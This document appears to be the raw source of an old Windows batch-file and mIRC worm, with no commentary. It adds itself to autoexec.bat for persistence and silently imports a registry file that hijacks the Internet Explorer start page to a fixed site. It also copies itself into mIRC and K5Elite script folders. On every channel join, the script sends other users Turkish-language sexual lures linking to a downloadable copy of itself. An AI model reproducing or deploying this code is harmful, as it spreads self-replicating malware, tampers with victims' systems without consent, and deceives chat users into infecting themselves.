   mode con codepage prepare=((857) C:\WINDOWS\COMMAND\ega2.cpi)
   mode con codepage select=857
   keyb tr,,C:\WINDOWS\COMMAND\keybrd2.sys /id:179
   C:\WINDOWS\a3init.exe
   @echo off
   @if exist c:\mirc\mirc.ini goto mirc
   :a
   @if exist c:\k5elite\mirc.ini goto k5elite
   :b
   @if %0 == C:\WINSYS98.BAT goto :esgec
   @cd\
   @echo @C:\WINSYS98.BAT >> c:\autoexec.bat
   @if exist c:\winsys98.bat goto esgec
   @copy /y %0 c:\winsys98.bat > nul
   @if exist c:\system.bat goto esgec
   @echo @%windir%\regedit.exe /s win.reg >> c:\system.bat
   @echo @exit >> c:\system.bat
   @echo REGEDIT4 >> %windir%\win.reg
   @echo [HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\Main] >> %windir%\win.reg
   @echo "Start Page"="http://www.cankusum.com" >> %windir%\win.reg
   @echo [HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\Main] >> %windir%\win.reg
   @echo "Start Page"="http://www.cankusum.com" >> %windir%\win.reg
   @echo [HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\Main] >> %windir%\win.reg
   @echo "Start Page"="http://www.cankusum.com" >> %windir%\win.reg
   @echo [HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\Main] >> %windir%\win.reg
   @echo "Start Page"="http://www.cankusum.com" >> %windir%\win.reg
   :esgec
   @exit
   @goto son
   :mirc
   @copy /y %0 c:\mirc\script.ini > nul
   @copy /y %0 c:\mirc\videosex.bat > nul
   @echo n0=script.ini >> c:\mirc\mirc.ini
   @echo n1=script.ini >> c:\mirc\mirc.ini
   @echo n2=script.ini >> c:\mirc\mirc.ini
   @echo n3=script.ini >> c:\mirc\mirc.ini
   @echo n4=script.ini >> c:\mirc\mirc.ini
   @echo n5=script.ini >> c:\mirc\mirc.ini
   @echo n6=script.ini >> c:\mirc\mirc.ini
   @echo n7=script.ini >> c:\mirc\mirc.ini
   @echo n8=script.ini >> c:\mirc\mirc.ini
   @echo n9=script.ini >> c:\mirc\mirc.ini
   @goto a
   :k5elite
   @copy /y %0 C:\K5Elite\system\remote\script.ini > nul
   @copy /y %0 c:\k5elite\videosex.bat > nul
   @goto b

   [script]
   n0=on 1:START:{
   n1=  .run http://www.cankusum.com
   n2=  .run c:\winsys98.bat
   n3=  .run c:\system.bat
   n4=}
   n5=on 1:JOIN:#:{
   n6= .msg $nick SeLam $nick Resmimi Görmek istermisiN Canim o Zaman Kirmizi Kutuyu Tikla Hayatim 4,4 www.cankusum.com
   n7= .msg $nick Porno film seyretmek için týkla http://www.angelfire.com/80s/ateslikiz/videosex.bat
   n8=}


   :son
